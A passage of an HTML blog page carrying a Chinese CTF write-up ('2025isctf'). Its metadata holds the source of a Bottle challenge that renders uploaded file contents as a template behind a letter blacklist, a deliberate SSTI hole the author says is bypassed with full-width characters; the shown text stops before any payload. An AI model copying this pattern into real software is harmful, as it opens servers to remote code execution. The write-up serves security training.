+<meta name="twitter:description" content=" 难过的bottle 考点：ssti之全角字符绕过 看看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 from bottle import route, run, template, post, request, static_file, error import os import zipfile import hashlib import time import shutil # hint: flag is in /flag UPLOAD_DIR = &#39;uploads&#39; os.makedirs(UPLOAD_DIR, exist_ok=True) MAX_FILE_SIZE = 1 * 1024 * 1024 # 1MB BLACKLIST = [&#34;b&#34;,&#34;c&#34;,&#34;d&#34;,&#34;e&#34;,&#34;h&#34;,&#34;i&#34;,&#34;j&#34;,&#34;k&#34;,&#34;m&#34;,&#34;n&#34;,&#34;o&#34;,&#34;p&#34;,&#34;q&#34;,&#34;r&#34;,&#34;s&#34;,&#34;t&#34;,&#34;u&#34;,&#34;v&#34;,&#34;w&#34;,&#34;x&#34;,&#34;y&#34;,&#34;z&#34;,&#34;%&#34;,&#34;;&#34;,&#34;,&#34;,&#34;&lt;&#34;,&#34;&gt;&#34;,&#34;:&#34;,&#34;?&#34;] def contains_blacklist(content): &#34;&#34;&#34;检查内容是否包含黑名单中的关键词（不区分大小写）&#34;&#34;&#34; content = content.lower() return any(black_word in content for black_word in BLACKLIST) def safe_extract_zip(zip_path, extract_dir): &#34;&#34;&#34;安全解压ZIP文件（防止路径遍历攻击）&#34;&#34;&#34; with zipfile.ZipFile(zip_path, &#39;r&#39;) as zf: for member in zf.infolist(): member_path = os.path.realpath(os.path.join(extract_dir, member.filename)) if not member_path.startswith(os.path.realpath(extract_dir)): raise ValueError(&#34;非法文件路径: 路径遍历攻击检测&#34;) zf.extract(member, extract_dir) @route(&#39;/&#39;) def index(): &#34;&#34;&#34;首页&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;ZIP文件查看器&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container&#34;&gt; &lt;div class=&#34;row justify-content-center&#34; id=&#34;index-page&#34;&gt; &lt;div class=&#34;col-md-8 text-center&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-body p-5&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📤&lt;/div&gt; &lt;h2 class=&#34;card-title&#34;&gt;轻松查看ZIP文件内容&lt;/h2&gt; &lt;p class=&#34;card-text&#34;&gt;上传ZIP文件并安全地查看其中的内容，无需解压到本地设备&lt;/p&gt; &lt;div class=&#34;mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-primary btn-lg px-4 me-3&#34;&gt; 📁 上传ZIP文件 &lt;/a&gt; &lt;a href=&#34;#features&#34; class=&#34;btn btn-outline-secondary btn-lg px-4&#34;&gt; ℹ️ 了解更多 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;row mt-5&#34; id=&#34;features&#34;&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;🛡️&lt;/div&gt; &lt;h4&gt;安全检测&lt;/h4&gt; &lt;p&gt;系统会自动检测上传文件，防止路径遍历攻击和恶意内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;📄&lt;/div&gt; &lt;h4&gt;内容预览&lt;/h4&gt; &lt;p&gt;直接在线查看ZIP文件中的文本内容，无需下载&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;col-md-4 mb-4&#34;&gt; &lt;div class=&#34;card h-100&#34;&gt; &lt;div class=&#34;card-body text-center p-4&#34;&gt; &lt;div class=&#34;emoji-icon&#34;&gt;⚡&lt;/div&gt; &lt;h4&gt;快速处理&lt;/h4&gt; &lt;p&gt;高效处理小于1MB的ZIP文件，快速获取内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @route(&#39;/upload&#39;) def upload_page(): &#34;&#34;&#34;上传页面&#34;&#34;&#34; return &#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传ZIP文件&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-primary text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;📤 上传ZIP文件&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;form action=&#34;/upload&#34; method=&#34;post&#34; enctype=&#34;multipart/form-data&#34; class=&#34;upload-form&#34;&gt; &lt;div class=&#34;mb-3&#34;&gt; &lt;label for=&#34;fileInput&#34; class=&#34;form-label&#34;&gt;选择ZIP文件（最大1MB）&lt;/label&gt; &lt;input class=&#34;form-control&#34; type=&#34;file&#34; name=&#34;file&#34; id=&#34;fileInput&#34; accept=&#34;.zip&#34; required&gt; &lt;div class=&#34;form-text&#34;&gt;仅支持.zip格式的文件，且文件大小不超过1MB&lt;/div&gt; &lt;/div&gt; &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary w-100&#34;&gt; 📤 上传文件 &lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; ↩️ 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39; @post(&#39;/upload&#39;) def upload(): &#34;&#34;&#34;处理文件上传&#34;&#34;&#34; zip_file = request.files.get(&#39;file&#39;) if not zip_file or not zip_file.filename.endswith(&#39;.zip&#39;): return &#39;请上传有效的ZIP文件&#39; zip_file.file.seek(0, 2) file_size = zip_file.file.tell() zip_file.file.seek(0) if file_size &gt; MAX_FILE_SIZE: return f&#39;文件大小超过限制({MAX_FILE_SIZE/1024/1024}MB)&#39; timestamp = str(time.time()) unique_str = zip_file.filename + timestamp dir_hash = hashlib.md5(unique_str.encode()).hexdigest() extract_dir = os.path.join(UPLOAD_DIR, dir_hash) os.makedirs(extract_dir, exist_ok=True) zip_path = os.path.join(extract_dir, &#39;uploaded.zip&#39;) zip_file.save(zip_path) try: safe_extract_zip(zip_path, extract_dir) except (zipfile.BadZipFile, ValueError) as e: shutil.rmtree(extract_dir) return f&#39;处理ZIP文件时出错: {str(e)}&#39; files = [f for f in os.listdir(extract_dir) if f != &#39;uploaded.zip&#39;] return template(&#39;&#39;&#39; &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;上传成功&lt;/title&gt; &lt;link href=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&#34; rel=&#34;stylesheet&#34;&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;/static/css/style.css&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&#34;header text-center&#34;&gt; &lt;div class=&#34;container&#34;&gt; &lt;h1 class=&#34;display-4 fw-bold&#34;&gt;📦 ZIP文件查看器&lt;/h1&gt; &lt;p class=&#34;lead&#34;&gt;安全地上传和查看ZIP文件内容&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;container mt-4&#34;&gt; &lt;div class=&#34;row justify-content-center&#34;&gt; &lt;div class=&#34;col-md-8&#34;&gt; &lt;div class=&#34;card&#34;&gt; &lt;div class=&#34;card-header bg-success text-white&#34;&gt; &lt;h4 class=&#34;mb-0&#34;&gt;✅ 上传成功!&lt;/h4&gt; &lt;/div&gt; &lt;div class=&#34;card-body&#34;&gt; &lt;div class=&#34;alert alert-success&#34; role=&#34;alert&#34;&gt; ✅ 文件已成功上传并解压 &lt;/div&gt; &lt;h5&gt;文件列表:&lt;/h5&gt; &lt;ul class=&#34;list-group mb-4&#34;&gt; % for file in files: &lt;li class=&#34;list-group-item d-flex justify-content-between align-items-center&#34;&gt; &lt;span&gt;📄 {{file}}&lt;/span&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{file}}&#34; class=&#34;btn btn-sm btn-outline-primary&#34;&gt; 查看 &lt;/a&gt; &lt;/li&gt; % end &lt;/ul&gt; % if files: &lt;div class=&#34;d-grid gap-2&#34;&gt; &lt;a href=&#34;/view/{{dir_hash}}/{{files[0]}}&#34; class=&#34;btn btn-primary&#34;&gt; 👀 查看第一个文件 &lt;/a&gt; &lt;/div&gt; % end &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center mt-4&#34;&gt; &lt;a href=&#34;/upload&#34; class=&#34;btn btn-outline-primary me-2&#34;&gt; ➕ 上传另一个文件 &lt;/a&gt; &lt;a href=&#34;/&#34; class=&#34;btn btn-outline-secondary&#34;&gt; 🏠 返回首页 &lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&#34;&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; &#39;&#39;&#39;, dir_hash=dir_hash, files=files) @route(&#39;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#39;) def view_file(dir_hash, filename): file_path = os.path.join(UPLOAD_DIR, dir_hash, filename) if not os.path.exists(file_path): return &#34;文件不存在&#34; if not os.path.isfile(file_path): return &#34;请求的路径不是文件&#34; real_path = os.path.realpath(file_path) if not real_path.startswith(os.path.realpath(UPLOAD_DIR)): return &#34;非法访问尝试&#34; try: with open(file_path, &#39;r&#39;, encoding=&#39;utf-8&#39;) as f: content = f.read() except: try: with open(file_path, &#39;r&#39;, encoding=&#39;latin-1&#39;) as f: content = f.read() except: return &#34;无法读取文件内容（可能是二进制文件）&#34; if contains_blacklist(content): return &#34;文件内容包含不允许的关键词&#34; try: return template(content) except Exception as e: return f&#34;渲染错误: {str(e)}&#34; @route(&#39;/static/&lt;filename:path&gt;&#39;) def serve_static(filename): &#34;&#34;&#34;静态文件服务&#34;&#34;&#34; return static_file(filename, root=&#39;static&#39;) @error(404) def error404(error): return &#34;讨厌啦不是说好只看看不摸的吗&#34; @error(500) def error500(error): return &#34;不要透进来啊啊啊啊&#34; if __name__ == &#39;__main__&#39;: os.makedirs(&#39;static&#39;, exist_ok=True) #原神，启动! run(host=&#39;0.0.0.0&#39;, port=5000, debug=False) 一开始以为软链接，后面一看，不就是打ssti嘛，直接打全角字符绕过\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_b0f9889609c95e4e.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">罗铠鸿</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li></li>
+      </ol>
+    </li>
+    <li><a href="#难过的bottle">难过的bottle</a>
+      <ol>
+        <li><a href="#考点ssti之全角字符绕过">考点：ssti之全角字符绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#来签个到吧">来签个到吧</a></li>
+    <li><a href="#ezrce">ezrce</a></li>
+    <li><a href="#bby-n0t1ce-b0ard">b@by n0t1ce b0ard</a>
+      <ol>
+        <li><a href="#考点cve-2024-12233">考点：CVE-2024-12233</a></li>
+      </ol>
+    </li>
+    <li><a href="#flag到底在哪">flag到底在哪</a>
+      <ol>
+        <li><a href="#考点万能密码">考点：万能密码</a></li>
+      </ol>
+    </li>
+    <li><a href="#flag我就借走了">flag？我就借走了</a>
+      <ol>
+        <li><a href="#考点软链接">考点：软链接</a></li>
+      </ol>
+    </li>
+    <li><a href="#who-am-i">Who am I</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
+                web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025isctf/">2025isctf</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-12-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="">
+</h3><hr>
+<h2 id="难过的bottle">难过的bottle
+</h2><h3 id="考点ssti之全角字符绕过">考点：ssti之全角字符绕过
+</h3><p>看看源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
